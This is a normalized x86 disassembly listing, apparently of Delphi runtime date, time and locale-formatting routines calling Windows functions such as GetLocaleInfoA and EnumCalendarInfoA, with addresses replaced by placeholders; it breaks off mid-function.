call sub_4098fc
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40984c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40984c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40984c
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_4098c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40984c
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40984c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40984c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409bac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409bac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40984c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408688
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4097e8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409bac
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4097e8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4097e8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40982c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40982c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408688
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4097e8
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_4097e8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40982c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40982c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c074
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408688
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4097e8
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409bac
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40984c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408688
test eax eax
jne r-xdata
push ebp
call sub_4098c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40982c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40982c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40982c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c074
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409bac
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4097e8
pop ecx
jmp r-xdata
push ebp
call sub_4098c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40982c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408688
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408688
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408688
test eax eax
jne r-xdata
jmp r-xdata
sub_40a360
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409bac
pop ecx
push ebp
mov eax ebx
call sub_409bac
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_4040d0
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a3d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4042a0
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a3f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a3d0
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4042a0
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a488
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a501
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a508
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a3d0
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4042a0
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404500
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407da8
test eax eax
jne r-xdata
mov eax edi
call sub_4042a0
add [ esi ] eax
mov bl 0x1
sub_40a514
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a3d0
mov eax esi
call sub_4042a0
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a54c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4042a0
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a598
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4042a0
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c0b8
mov [ ebx ] eax
jmp r-xdata
sub_40a5e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4044a0
push eax
mov eax [ ebx ]
call sub_4044a0
pop edx
call sub_40c1b8
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a634
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4097d4
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a690
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a9ab
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a54c
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c0f4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a3f4
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a598
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404500
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407e18
mov eax [ ebp - 0x1c ]
call sub_40a5e0
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a9b2
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_404004
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a514
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a3f4
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a514
test al al
je r-xdata
call sub_4097d4
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a3f4
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409578
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4045e4
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a514
mov edx ebx
mov eax esi
call sub_40a3d0
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4042a0
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a598
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a634
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a3d0
mov eax esi
call sub_4042a0
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_4097d4
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4042a0
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404500
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407da8
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4042a0
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404500
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407da8
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a9d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a488
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a488
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a488
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a3f4
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a3d0
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a488
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a514
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a3f4
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a488
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a514
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a3d0
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409470
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a488
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a3f4
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a488
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a514
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a488
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a3f4
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40abc8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a9d4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042a0
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40abfc
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a690
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40abc8
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4042a0
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a9d4
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ac88
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_4040d0
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40acd4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_404034
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_4040d0
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ad20
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ad48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40acd4
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405b10
sub_40ad84
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40ae97
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40ad48
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404034
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40ad48
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404034
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40ad48
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404034
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40ad48
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404034
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae9e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404004
retn
sub_40aea8
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40aee4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40af49
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408090
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af50
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
inc ebx
sub_40af5c
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40aff3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40acd4
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408090
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40affa
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40aea8
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40aee4
call EnumCalendarInfoA
sub_40b00c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b1d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403fe0
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40acd4
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408090
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4042a0
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1dd
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404004
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408688
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c07c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
